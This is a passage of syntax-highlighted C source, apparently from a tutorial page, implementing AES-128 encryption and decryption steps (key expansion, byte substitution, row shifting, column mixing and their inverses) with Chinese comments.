class="hljs-string">&quot;\n&quot;</span>);<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n&quot;</span>);<br>&#125;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * 打印字符串的ASSCI，</span><br><span class="hljs-comment"> * 以十六进制显示。</span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">printASSCI</span><span class="hljs-params">(<span class="hljs-keyword">char</span> *str, <span class="hljs-keyword">int</span> len)</span> </span>&#123;<br>    <span class="hljs-keyword">int</span> i;<br>    <span class="hljs-keyword">for</span>(i = <span class="hljs-number">0</span>; i &lt; len; i++)<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;0x%x &quot;</span>, getIntFromChar(str[i]));<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n&quot;</span>);<br>&#125;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * 把连续的4个字符合并成一个4字节的整型</span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span> <span class="hljs-title">getWordFromStr</span><span class="hljs-params">(<span class="hljs-keyword">char</span> *str)</span> </span>&#123;<br>    <span class="hljs-keyword">int</span> one, two, three, four;<br>    one = getIntFromChar(str[<span class="hljs-number">0</span>]);<br>    one = one &lt;&lt; <span class="hljs-number">24</span>;<br>    two = getIntFromChar(str[<span class="hljs-number">1</span>]);<br>    two = two &lt;&lt; <span class="hljs-number">16</span>;<br>    three = getIntFromChar(str[<span class="hljs-number">2</span>]);<br>    three = three &lt;&lt; <span class="hljs-number">8</span>;<br>    four = getIntFromChar(str[<span class="hljs-number">3</span>]);<br>    <span class="hljs-keyword">return</span> one | two | three | four;<br>&#125;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * 把一个4字节的数的第一、二、三、四个字节取出，</span><br><span class="hljs-comment"> * 入进一个4个元素的整型数组里面。</span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">splitIntToArray</span><span class="hljs-params">(<span class="hljs-keyword">int</span> num, <span class="hljs-keyword">int</span> <span class="hljs-built_in">array</span>[<span class="hljs-number">4</span>])</span> </span>&#123;<br>    <span class="hljs-keyword">int</span> one, two, three;<br>    one = num &gt;&gt; <span class="hljs-number">24</span>;<br>    <span class="hljs-built_in">array</span>[<span class="hljs-number">0</span>] = one &amp; <span class="hljs-number">0x000000ff</span>;<br>    two = num &gt;&gt; <span class="hljs-number">16</span>;<br>    <span class="hljs-built_in">array</span>[<span class="hljs-number">1</span>] = two &amp; <span class="hljs-number">0x000000ff</span>;<br>    three = num &gt;&gt; <span class="hljs-number">8</span>;<br>    <span class="hljs-built_in">array</span>[<span class="hljs-number">2</span>] = three &amp; <span class="hljs-number">0x000000ff</span>;<br>    <span class="hljs-built_in">array</span>[<span class="hljs-number">3</span>] = num &amp; <span class="hljs-number">0x000000ff</span>;<br>&#125;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * 将数组中的元素循环左移step位</span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">leftLoop4int</span><span class="hljs-params">(<span class="hljs-keyword">int</span> <span class="hljs-built_in">array</span>[<span class="hljs-number">4</span>], <span class="hljs-keyword">int</span> step)</span> </span>&#123;<br>    <span class="hljs-keyword">int</span> temp[<span class="hljs-number">4</span>];<br>    <span class="hljs-keyword">int</span> i;<br>    <span class="hljs-keyword">int</span> index;<br>    <span class="hljs-keyword">for</span>(i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">4</span>; i++)<br>        temp[i] = <span class="hljs-built_in">array</span>[i];<br><br>    index = step % <span class="hljs-number">4</span> == <span class="hljs-number">0</span> ? <span class="hljs-number">0</span> : step % <span class="hljs-number">4</span>;<br>    <span class="hljs-keyword">for</span>(i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">4</span>; i++)&#123;<br>        <span class="hljs-built_in">array</span>[i] = temp[index];<br>        index++;<br>        index = index % <span class="hljs-number">4</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * 把数组中的第一、二、三和四元素分别作为</span><br><span class="hljs-comment"> * 4字节整型的第一、二、三和四字节，合并成一个4字节整型</span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span> <span class="hljs-title">mergeArrayToInt</span><span class="hljs-params">(<span class="hljs-keyword">int</span> <span class="hljs-built_in">array</span>[<span class="hljs-number">4</span>])</span> </span>&#123;<br>    <span class="hljs-keyword">int</span> one = <span class="hljs-built_in">array</span>[<span class="hljs-number">0</span>] &lt;&lt; <span class="hljs-number">24</span>;<br>    <span class="hljs-keyword">int</span> two = <span class="hljs-built_in">array</span>[<span class="hljs-number">1</span>] &lt;&lt; <span class="hljs-number">16</span>;<br>    <span class="hljs-keyword">int</span> three = <span class="hljs-built_in">array</span>[<span class="hljs-number">2</span>] &lt;&lt; <span class="hljs-number">8</span>;<br>    <span class="hljs-keyword">int</span> four = <span class="hljs-built_in">array</span>[<span class="hljs-number">3</span>];<br>    <span class="hljs-keyword">return</span> one | two | three | four;<br>&#125;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * 常量轮值表</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">static</span> <span class="hljs-keyword">const</span> <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> Rcon[<span class="hljs-number">10</span>] = &#123; <span class="hljs-number">0x01000000</span>, <span class="hljs-number">0x02000000</span>,<br>                              <span class="hljs-number">0x04000000</span>, <span class="hljs-number">0x08000000</span>,<br>                              <span class="hljs-number">0x10000000</span>, <span class="hljs-number">0x20000000</span>,<br>                              <span class="hljs-number">0x40000000</span>, <span class="hljs-number">0x80000000</span>,<br>                              <span class="hljs-number">0x1b000000</span>, <span class="hljs-number">0x36000000</span> &#125;;<br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * 密钥扩展中的T函数</span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span> <span class="hljs-title">T</span><span class="hljs-params">(<span class="hljs-keyword">int</span> num, <span class="hljs-keyword">int</span> round)</span> </span>&#123;<br>    <span class="hljs-keyword">int</span> numArray[<span class="hljs-number">4</span>];<br>    <span class="hljs-keyword">int</span> i;<br>    <span class="hljs-keyword">int</span> result;<br>    splitIntToArray(num, numArray);<br>    leftLoop4int(numArray, <span class="hljs-number">1</span>);<span class="hljs-comment">//字循环</span><br><br>    <span class="hljs-comment">//字节代换</span><br>    <span class="hljs-keyword">for</span>(i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">4</span>; i++)<br>        numArray[i] = getNumFromSBox(numArray[i]);<br><br>    result = mergeArrayToInt(numArray);<br>    <span class="hljs-keyword">return</span> result ^ Rcon[round];<br>&#125;<br><br><span class="hljs-comment">//密钥对应的扩展数组</span><br><span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span> w[<span class="hljs-number">44</span>];<br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * 打印W数组</span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">printW</span><span class="hljs-params">()</span> </span>&#123;<br>    <span class="hljs-keyword">int</span> i, j;<br>    <span class="hljs-keyword">for</span>(i = <span class="hljs-number">0</span>, j = <span class="hljs-number">1</span>; i &lt; <span class="hljs-number">44</span>; i++,j++)&#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;w[%d] = 0x%x &quot;</span>, i, w[i]);<br>        <span class="hljs-keyword">if</span>(j % <span class="hljs-number">4</span> == <span class="hljs-number">0</span>)<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n&quot;</span>);<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n&quot;</span>);<br>&#125;<br><br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * 扩展密钥，结果是把w[44]中的每个元素初始化</span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">extendKey</span><span class="hljs-params">(<span class="hljs-keyword">char</span> *key)</span> </span>&#123;<br>    <span class="hljs-keyword">int</span> i,j;<br>    <span class="hljs-keyword">for</span>(i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">4</span>; i++)<br>        w[i] = getWordFromStr(key + i * <span class="hljs-number">4</span>);<br><br><span class="hljs-comment">//    w[0] = 0x30373430;</span><br><span class="hljs-comment">//    w[1] = 0x63623964;</span><br><span class="hljs-comment">//    w[2] = 0x62383633;</span><br><span class="hljs-comment">//    w[3] = 0x636436F2;</span><br><br>    <span class="hljs-keyword">for</span>(i = <span class="hljs-number">4</span>, j = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">44</span>; i++) &#123;<br>        <span class="hljs-keyword">if</span>( i % <span class="hljs-number">4</span> == <span class="hljs-number">0</span>) &#123;<br>            w[i] = w[i - <span class="hljs-number">4</span>] ^ T(w[i - <span class="hljs-number">1</span>], j);<br>            j++;<br>        &#125;<span class="hljs-keyword">else</span> &#123;<br>            w[i] = w[i - <span class="hljs-number">4</span>] ^ w[i - <span class="hljs-number">1</span>];<br>        &#125;<br>    &#125;<br><br>&#125;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * 轮密钥加</span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">addRoundKey</span><span class="hljs-params">(<span class="hljs-keyword">int</span> <span class="hljs-built_in">array</span>[<span class="hljs-number">4</span>][<span class="hljs-number">4</span>], <span class="hljs-keyword">int</span> round)</span> </span>&#123;<br>    <span class="hljs-keyword">int</span> warray[<span class="hljs-number">4</span>];<br>    <span class="hljs-keyword">int</span> i,j;<br>    <span class="hljs-keyword">for</span>(i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">4</span>; i++) &#123;<br><br>        splitIntToArray(w[ round * <span class="hljs-number">4</span> + i], warray);<br><br>        <span class="hljs-keyword">for</span>(j = <span class="hljs-number">0</span>; j &lt; <span class="hljs-number">4</span>; j++) &#123;<br>            <span class="hljs-comment">//printf(&quot;%x \n&quot;, warray[j]);</span><br>            <span class="hljs-built_in">array</span>[j][i] = <span class="hljs-built_in">array</span>[j][i] ^ warray[j];<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * 字节代换</span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">subBytes</span><span class="hljs-params">(<span class="hljs-keyword">int</span> <span class="hljs-built_in">array</span>[<span class="hljs-number">4</span>][<span class="hljs-number">4</span>])</span></span>&#123;<br>    <span class="hljs-keyword">int</span> i,j;<br>    <span class="hljs-keyword">for</span>(i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">4</span>; i++)<br>        <span class="hljs-keyword">for</span>(j = <span class="hljs-number">0</span>; j &lt; <span class="hljs-number">4</span>; j++)<br>            <span class="hljs-built_in">array</span>[i][j] = getNumFromSBox(<span class="hljs-built_in">array</span>[i][j]);<br>&#125;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * 行移位</span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">shiftRows</span><span class="hljs-params">(<span class="hljs-keyword">int</span> <span class="hljs-built_in">array</span>[<span class="hljs-number">4</span>][<span class="hljs-number">4</span>])</span> </span>&#123;<br>    <span class="hljs-keyword">int</span> rowTwo[<span class="hljs-number">4</span>], rowThree[<span class="hljs-number">4</span>], rowFour[<span class="hljs-number">4</span>];<br>    <span class="hljs-keyword">int</span> i;<br>    <span class="hljs-keyword">for</span>(i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">4</span>; i++) &#123;<br>        rowTwo[i] = <span class="hljs-built_in">array</span>[<span class="hljs-number">1</span>][i];<br>        rowThree[i] = <span class="hljs-built_in">array</span>[<span class="hljs-number">2</span>][i];<br>        rowFour[i] = <span class="hljs-built_in">array</span>[<span class="hljs-number">3</span>][i];<br>    &#125;<br><br>    leftLoop4int(rowTwo, <span class="hljs-number">1</span>);<br>    leftLoop4int(rowThree, <span class="hljs-number">2</span>);<br>    leftLoop4int(rowFour, <span class="hljs-number">3</span>);<br><br>    <span class="hljs-keyword">for</span>(i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">4</span>; i++) &#123;<br>        <span class="hljs-built_in">array</span>[<span class="hljs-number">1</span>][i] = rowTwo[i];<br>        <span class="hljs-built_in">array</span>[<span class="hljs-number">2</span>][i] = rowThree[i];<br>        <span class="hljs-built_in">array</span>[<span class="hljs-number">3</span>][i] = rowFour[i];<br>    &#125;<br>&#125;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * 列混合要用到的矩阵</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">static</span> <span class="hljs-keyword">const</span> <span class="hljs-keyword">int</span> colM[<span class="hljs-number">4</span>][<span class="hljs-number">4</span>] = &#123; <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>,<br>                                <span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">1</span>,<br>                                <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>,<br>                                <span class="hljs-number">3</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">2</span> &#125;;<br><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span> <span class="hljs-title">GFMul2</span><span class="hljs-params">(<span class="hljs-keyword">int</span> s)</span> </span>&#123;<br>    <span class="hljs-keyword">int</span> result = s &lt;&lt; <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">int</span> a7 = result &amp; <span class="hljs-number">0x00000100</span>;<br><br>    <span class="hljs-keyword">if</span>(a7 != <span class="hljs-number">0</span>) &#123;<br>        result = result &amp; <span class="hljs-number">0x000000ff</span>;<br>        result = result ^ <span class="hljs-number">0x1b</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> result;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span> <span class="hljs-title">GFMul3</span><span class="hljs-params">(<span class="hljs-keyword">int</span> s)</span> </span>&#123;<br>    <span class="hljs-keyword">return</span> GFMul2(s) ^ s;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span> <span class="hljs-title">GFMul4</span><span class="hljs-params">(<span class="hljs-keyword">int</span> s)</span> </span>&#123;<br>    <span class="hljs-keyword">return</span> GFMul2(GFMul2(s));<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span> <span class="hljs-title">GFMul8</span><span class="hljs-params">(<span class="hljs-keyword">int</span> s)</span> </span>&#123;<br>    <span class="hljs-keyword">return</span> GFMul2(GFMul4(s));<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span> <span class="hljs-title">GFMul9</span><span class="hljs-params">(<span class="hljs-keyword">int</span> s)</span> </span>&#123;<br>    <span class="hljs-keyword">return</span> GFMul8(s) ^ s;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span> <span class="hljs-title">GFMul11</span><span class="hljs-params">(<span class="hljs-keyword">int</span> s)</span> </span>&#123;<br>    <span class="hljs-keyword">return</span> GFMul9(s) ^ GFMul2(s);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span> <span class="hljs-title">GFMul12</span><span class="hljs-params">(<span class="hljs-keyword">int</span> s)</span> </span>&#123;<br>    <span class="hljs-keyword">return</span> GFMul8(s) ^ GFMul4(s);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span> <span class="hljs-title">GFMul13</span><span class="hljs-params">(<span class="hljs-keyword">int</span> s)</span> </span>&#123;<br>    <span class="hljs-keyword">return</span> GFMul12(s) ^ s;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span> <span class="hljs-title">GFMul14</span><span class="hljs-params">(<span class="hljs-keyword">int</span> s)</span> </span>&#123;<br>    <span class="hljs-keyword">return</span> GFMul12(s) ^ GFMul2(s);<br>&#125;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * GF上的二元运算</span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span> <span class="hljs-title">GFMul</span><span class="hljs-params">(<span class="hljs-keyword">int</span> n, <span class="hljs-keyword">int</span> s)</span> </span>&#123;<br>    <span class="hljs-keyword">int</span> result;<br><br>    <span class="hljs-keyword">if</span>(n == <span class="hljs-number">1</span>)<br>        result = s;<br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(n == <span class="hljs-number">2</span>)<br>        result = GFMul2(s);<br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(n == <span class="hljs-number">3</span>)<br>        result = GFMul3(s);<br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(n == <span class="hljs-number">0x9</span>)<br>        result = GFMul9(s);<br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(n == <span class="hljs-number">0xb</span>)<span class="hljs-comment">//11</span><br>        result = GFMul11(s);<br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(n == <span class="hljs-number">0xd</span>)<span class="hljs-comment">//13</span><br>        result = GFMul13(s);<br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(n == <span class="hljs-number">0xe</span>)<span class="hljs-comment">//14</span><br>        result = GFMul14(s);<br><br>    <span class="hljs-keyword">return</span> result;<br>&#125;<br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * 列混合</span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">mixColumns</span><span class="hljs-params">(<span class="hljs-keyword">int</span> <span class="hljs-built_in">array</span>[<span class="hljs-number">4</span>][<span class="hljs-number">4</span>])</span> </span>&#123;<br><br>    <span class="hljs-keyword">int</span> tempArray[<span class="hljs-number">4</span>][<span class="hljs-number">4</span>];<br>    <span class="hljs-keyword">int</span> i,j;<br>    <span class="hljs-keyword">for</span>(i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">4</span>; i++)<br>        <span class="hljs-keyword">for</span>(j = <span class="hljs-number">0</span>; j &lt; <span class="hljs-number">4</span>; j++)<br>            tempArray[i][j] = <span class="hljs-built_in">array</span>[i][j];<br><br>    <span class="hljs-keyword">for</span>(i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">4</span>; i++)<br>        <span class="hljs-keyword">for</span>(j = <span class="hljs-number">0</span>; j &lt; <span class="hljs-number">4</span>; j++)&#123;<br>            <span class="hljs-built_in">array</span>[i][j] = GFMul(colM[i][<span class="hljs-number">0</span>],tempArray[<span class="hljs-number">0</span>][j]) ^ GFMul(colM[i][<span class="hljs-number">1</span>],tempArray[<span class="hljs-number">1</span>][j])<br>                          ^ GFMul(colM[i][<span class="hljs-number">2</span>],tempArray[<span class="hljs-number">2</span>][j]) ^ GFMul(colM[i][<span class="hljs-number">3</span>], tempArray[<span class="hljs-number">3</span>][j]);<br>        &#125;<br>&#125;<br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * 把4X4数组转回字符串</span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">convertArrayToStr</span><span class="hljs-params">(<span class="hljs-keyword">int</span> <span class="hljs-built_in">array</span>[<span class="hljs-number">4</span>][<span class="hljs-number">4</span>], <span class="hljs-keyword">char</span> *str)</span> </span>&#123;<br>    <span class="hljs-keyword">int</span> i,j;<br>    <span class="hljs-keyword">for</span>(i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">4</span>; i++)<br>        <span class="hljs-keyword">for</span>(j = <span class="hljs-number">0</span>; j &lt; <span class="hljs-number">4</span>; j++)<br>            *str++ = (<span class="hljs-keyword">char</span>)<span class="hljs-built_in">array</span>[j][i];<br>&#125;<br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * 检查密钥长度</span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span> <span class="hljs-title">checkKeyLen</span><span class="hljs-params">(<span class="hljs-keyword">int</span> len)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span>(len == <span class="hljs-number">16</span>)<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">else</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * 根据索引从逆S盒中获取值</span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span> <span class="hljs-title">getNumFromS1Box</span><span class="hljs-params">(<span class="hljs-keyword">int</span> index)</span> </span>&#123;<br>    <span class="hljs-keyword">int</span> row = getLeft4Bit(index);<br>    <span class="hljs-keyword">int</span> col = getRight4Bit(index);<br>    <span class="hljs-keyword">return</span> S2[row][col];<br>&#125;<br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * 逆字节变换</span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">deSubBytes</span><span class="hljs-params">(<span class="hljs-keyword">int</span> <span class="hljs-built_in">array</span>[<span class="hljs-number">4</span>][<span class="hljs-number">4</span>])</span> </span>&#123;<br>    <span class="hljs-keyword">int</span> i,j;<br>    <span class="hljs-keyword">for</span>(i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">4</span>; i++)<br>        <span class="hljs-keyword">for</span>(j = <span class="hljs-number">0</span>; j &lt; <span class="hljs-number">4</span>; j++)<br>            <span class="hljs-built_in">array</span>[i][j] = getNumFromS1Box(<span class="hljs-built_in">array</span>[i][j]);<br>&#125;<br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * 把4个元素的数组循环右移step位</span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">rightLoop4int</span><span class="hljs-params">(<span class="hljs-keyword">int</span> <span class="hljs-built_in">array</span>[<span class="hljs-number">4</span>], <span class="hljs-keyword">int</span> step)</span> </span>&#123;<br>    <span class="hljs-keyword">int</span> temp[<span class="hljs-number">4</span>];<br>    <span class="hljs-keyword">int</span> i;<br>    <span class="hljs-keyword">int</span> index;<br>    <span class="hljs-keyword">for</span>(i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">4</span>; i++)<br>        temp[i] = <span class="hljs-built_in">array</span>[i];<br><br>    index = step % <span class="hljs-number">4</span> == <span class="hljs-number">0</span> ? <span class="hljs-number">0</span> : step % <span class="hljs-number">4</span>;<br>    index = <span class="hljs-number">3</span> - index;<br>    <span class="hljs-keyword">for</span>(i = <span class="hljs-number">3</span>; i &gt;= <span class="hljs-number">0</span>; i--) &#123;<br>        <span class="hljs-built_in">array</span>[i] = temp[index];<br>        index--;<br>        index = index == <span class="hljs-number">-1</span> ? <span class="hljs-number">3</span> : index;<br>    &#125;<br>&#125;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * 逆行移位</span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">deShiftRows</span><span class="hljs-params">(<span class="hljs-keyword">int</span> <span class="hljs-built_in">array</span>[<span class="hljs-number">4</span>][<span class="hljs-number">4</span>])</span> </span>&#123;<br>    <span class="hljs-keyword">int</span> rowTwo[<span class="hljs-number">4</span>], rowThree[<span class="hljs-number">4</span>], rowFour[<span class="hljs-number">4</span>];<br>    <span class="hljs-keyword">int</span> i;<br>    <span class="hljs-keyword">for</span>(i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">4</span>; i++) &#123;<br>        rowTwo[i] = <span class="hljs-built_in">array</span>[<span class="hljs-number">1</span>][i];<br>        rowThree[i] = <span class="hljs-built_in">array</span>[<span class="hljs-number">2</span>][i];<br>        rowFour[i] = <span class="hljs-built_in">array</span>[<span class="hljs-number">3</span>][i];<br>    &#125;<br><br>    rightLoop4int(rowTwo, <span class="hljs-number">1</span>);<br>    rightLoop4int(rowThree, <span class="hljs-number">2</span>);<br>    rightLoop4int(rowFour, <span class="hljs-number">3</span>);<br><br>    <span class="hljs-keyword">for</span>(i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">4</span>; i++) &#123;<br>        <span class="hljs-built_in">array</span>[<span class="hljs-number">1</span>][i] = rowTwo[i];<br>        <span class="hljs-built_in">array</span>[<span class="hljs-number">2</span>][i] = rowThree[i];<br>        <span class="hljs-built_in">array</span>[<span class="hljs-number">3</span>][i] = rowFour[i];<br>    &#125;<br>&#125;<br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * 逆列混合用到的矩阵</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">static</span> <span class="hljs-keyword">const</span> <span class="hljs-keyword">int</span> deColM[<span class="hljs-number">4</span>][<span class="hljs-number">4</span>] = &#123; <span class="hljs-number">0xe</span>, <span class="hljs-number">0xb</span>, <span class="hljs-number">0xd</span>, <span class="hljs-number">0x9</span>,<br>                                  <span class="hljs-number">0x9</span>, <span class="hljs-number">0xe</span>, <span class="hljs-number">0xb</span>, <span class="hljs-number">0xd</span>,<br>                                  <span class="hljs-number">0xd</span>, <span class="hljs-number">0x9</span>, <span class="hljs-number">0xe</span>, <span class="hljs-number">0xb</span>,<br>                                  <span class="hljs-number">0xb</span>, <span class="hljs-number">0xd</span>, <span class="hljs-number">0x9</span>, <span class="hljs-number">0xe</span> &#125;;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * 逆列混合</span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">deMixColumns</span><span class="hljs-params">(<span class="hljs-keyword">int</span> <span class="hljs-built_in">array</span>[<span class="hljs-number">4</span>][<span class="hljs-number">4</span>])</span> </span>&#123;<br>    <span class="hljs-keyword">int</span> tempArray[<span class="hljs-number">4</span>][<span class="hljs-number">4</span>];<br>    <span class="hljs-keyword">int</span> i,j;<br>    <span class="hljs-keyword">for</span>(i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">4</span>; i++)<br>        <span class="hljs-keyword">for</span>(j = <span class="hljs-number">0</span>; j &lt; <span class="hljs-number">4</span>; j++)<br>            tempArray[i][j] = <span class="hljs-built_in">array</span>[i][j];<br><br>    <span class="hljs-keyword">for</span>(i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">4</span>; i++)<br>        <span class="hljs-keyword">for</span>(j = <span class="hljs-number">0</span>; j &lt; <span class="hljs-number">4</span>; j++)&#123;<br>            <span class="hljs-built_in">array</span>[i][j] = GFMul(deColM[i][<span class="hljs-number">0</span>],tempArray[<span class="hljs-number">0</span>][j]) ^ GFMul(deColM[i][<span class="hljs-number">1</span>],tempArray[<span class="hljs-number">1</span>][j])<br>                          ^ GFMul(deColM[i][<span class="hljs-number">2</span>],tempArray[<span class="hljs-number">2</span>][j]) ^ GFMul(deColM[i][<span class="hljs-number">3</span>], tempArray[<span class="hljs-number">3</span>][j]);<br>        &#125;<br>&#125;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * 把两个4X4数组进行异或</span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">addRoundTowArray</span><span class="hljs-params">(<span class="hljs-keyword">int</span> aArray[<span class="hljs-number">4</span>][<span class="hljs-number">4</span>],<span class="hljs-keyword">int</span> bArray[<span class="hljs-number">4</span>][<span class="hljs-number">4</span>])</span> </span>&#123;<br>    <span class="hljs-keyword">int</span> i,j;<br>    <span class="hljs-keyword">for</span>(i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">4</span>; i++)<br>        <span class="hljs-keyword">for</span>(j = <span class="hljs-number">0</span>; j &lt; <span class="hljs-number">4</span>; j++)<br>            aArray[i][j] = aArray[i][j] ^ bArray[i][j];<br>&#125;<br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * 从4个32位的密钥字中获得4X4数组，</span><br><span class="hljs-comment"> * 用于进行逆列混合</span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">getArrayFrom4W</span><span class="hljs-params">(<span class="hljs-keyword">int</span> i, <span class="hljs-keyword">int</span> <span class="hljs-built_in">array</span>[<span 